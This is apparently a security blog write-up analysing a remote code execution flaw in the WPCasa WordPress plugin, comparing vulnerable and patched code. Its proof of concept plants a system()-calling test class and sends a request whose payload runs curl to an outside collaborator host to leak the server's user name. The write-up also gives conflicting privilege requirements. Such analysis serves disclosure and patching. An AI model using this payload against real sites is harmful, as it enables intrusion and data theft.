# CVE-2025-9321 Analysis & POC


<!--more-->

## CVE & Basic Info
The WPCasa WordPress plugin is vulnerable to Code Injection in all versions up to and including 1.4.1. The root cause is insufficient validation and restriction of input within the `'api_requests'` function. This allows an unauthenticated attacker to invoke arbitrary functions and execute code.

* **CVE ID**: [CVE-2025-9321](https://www.cve.org/CVERecord?id=CVE-2025-9321)
* **Vulnerability Type**: Remote Code Execution
* **Affected Versions**: <= 1.4.1
* **Patched Versions**: 1.4.2
* **CVSS severity**: High (10)
* **Required Privilege**: Contributor
* **Product**: [WordPress WPCasa Plugin](https://wordpress.org/plugins/wpcasa/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **WPCasa**:  
    * `1.4.1` – **vulnerable**  
    * `1.4.2` – **patched**
* **Diff Tool** → [**Meld**](https://meldmerge.org/) or any diff tool.

## Cause
**In the vulnerable version (v1.4.1):**

```php {title="class-wpsight-api.php v1.4.1" data-open=true hl_lines=[15,16]}
public function api_requests() {
    global $wp;

    if ( ! empty( $_GET['wpsight-api'] ) )
        $wp->query_vars['wc-api'] = sanitize_text_field( $_GET['wpsight-api'] );

    if ( ! empty( $wp->query_vars['wc-api'] ) ) {
        // Buffer, we won't want any output here
        ob_start();

        // Get API trigger
        $api = strtolower( esc_attr( $wp->query_vars['wpsight-api'] ) );

        // Load class if exists
        if ( class_exists( $api ) )
            $api_class = new $api();

        // Trigger actions
        do_action( 'wpsight_api_' . $api );

        // Done, clear buffer and exit
        ob_end_clean();
        die('1');
    }
}
````

This function reads the `wpsight-api` parameter from the URL, uses it to instantiate a class if it exists, triggers the associated `do_action` hook, and finally terminates with `die('1')`. The issue is that the URL-supplied data is not tightly controlled, making it easy to exploit for code execution.

**Patched version (v1.4.2):**

```php {title="class-wpsight-api.php v1.4.2" data-open=false hl_lines=[]}
public function api_requests() {
    global $wp;

    // 1) Preferred getter.
    $raw = get_query_var( 'wpsight-api' );

    // 2) Fallback: directly from $wp->query_vars.
    if ( empty( $raw ) && isset( $wp->query_vars['wpsight-api'] ) ) {
        $raw = $wp->query_vars['wpsight-api'];
    }

    // 3) Last resort: direct $_GET.
    if ( empty( $raw ) && ! empty( $_GET['wpsight-api'] ) ) {
        $raw = sanitize_text_field( wp_unslash( $_GET['wpsight-api'] ) );
    }

    // No request found → exit early.
    if ( empty( $raw ) ) {
        return;
    }

    // Sanitize to a valid key.
    $api = sanitize_key( $raw );

    if ( empty( $api ) ) {
        return;
    }

    /**
        * Build allow-list of allowed API endpoints.
        */
    $allowed = apply_filters(
        'wpsight_api_allowed_endpoints',
        array()
    );

    // If API is not allowed, block access.
    if ( ! isset( $allowed[ $api ] ) ) {
        wp_die(
            sprintf(
                esc_html__( 'Endpoint "%s" not allowed.', 'wpcasa' ),
                $api
            ),
            esc_html__( 'Forbidden', 'wpcasa' ),
            array( 'response' => 403 )
        );
    }

    // Start output buffering.
    ob_start();

    // Optional: safe class instantiation if explicitly allowed.
    if ( ! empty( $allowed[ $api ]['class'] ) && class_exists( $allowed[ $api ]['class'] ) ) {
        new $allowed[ $api ]['class']();
    }

    /**
        * Trigger API action hook.
        */
    do_action( 'wpsight_api_' . $api );

    if ( defined( 'WP_DEBUG' ) && WP_DEBUG ) {
        ob_end_flush();
    } else {
        ob_end_clean();
    }

    die( '1' );
}
```

![Diff](diff.png "Patch changes")

The patch:

* Reads input with layered fallbacks: `get_query_var` → `$wp->query_vars` → `$_GET`.
* Uses `sanitize_key` for strict input control.
* Enforces an allow‑list using `wpsight_api_allowed_endpoints`.
* Blocks all endpoints not explicitly allowed (403).
* Only instantiates classes if clearly defined in the allow-list.
* Improves safety and prevents unauthorized code execution.

## Analysis

The plugin registers this action hook:

```php {title="class-wpsight-api.php v1.4.1" data-open=true hl_lines=[]}
add_action( 'parse_request', array( $this, 'api_requests'), 0 );
```

* `parse_request`: This hook fires very early, right after WordPress parses the URL and populates `$wp`. It is responsible for processing query variables, meaning the `api_requests` callback executes immediately when processing the request.

## Flow

{{< mermaid >}}
graph TD

A["Attacker sends request /?wpsight-api=payload"] --> B["parse_request hook triggers api_requests()"]

B --> C["Read user input $_GET['wpsight-api']"]
C --> D["$api = strtolower(esc_attr(...))"]

D --> E{"class_exists($api)?"}
E -- Yes --> F["Instantiate arbitrary class new $api() → constructor executes"]
E -- No --> G["Skip class creation"]

F --> H["Trigger dynamic hook do_action('wpsight_api_' . $api)"]
G --> H

H --> I{"Hook handler exists?"}
I -- Yes --> J["Callback executed → attacker-controlled code"]
I -- No --> K["No action, but die('1') still called"]

J --> L["RCE achieved"]
K --> L

L --> Z["End"]
{{< /mermaid >}}

## Proof of Concept (PoC)

1. Create an evil class in wp-config.php for testing:

```php
class evil
{
    public $command = "ls /";
	public function __construct() {
		$this->command = isset($_REQUEST['cmd']) ? $_REQUEST['cmd'] : $this->command;
		die(system($this->command));
	}
}
```

2. Send a request with payload:

```http
GET /?wpsight-api=evil&cmd=curl+http://n9xe0s2jxjyt8klg2lxcj4b6jxpode13.oastify.com/?leaked=$(whoami) HTTP/1.1
Host: localhost
```

![Result](result.png "Output")

## Conclusion

The vulnerability results from unsafe handling of the `wpsight-api` parameter, allowing arbitrary class instantiation and hook execution, leading to RCE. The patch adds strict input validation and endpoint restrictions to prevent exploitation.

## Key Takeaways

* URL‑supplied data must be restricted using allow‑lists.
* Dynamic hooks and class instantiation must not rely on user input.
* Insufficient input validation can lead to critical RCE vulnerabilities.

## References

[Remote Code Execution (RCE)](https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/)

[WordPress WPCasa Plugin <= 1.4.1 is vulnerable to PHP Object Injection](https://patchstack.com/database/wordpress/plugin/wpcasa/vulnerability/wordpress-wpcasa-plugin-1-4-1-unauthenticated-code-injection-vulnerability)


---

> Author: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/posts/2025-11-28-cve-2025-9321/  

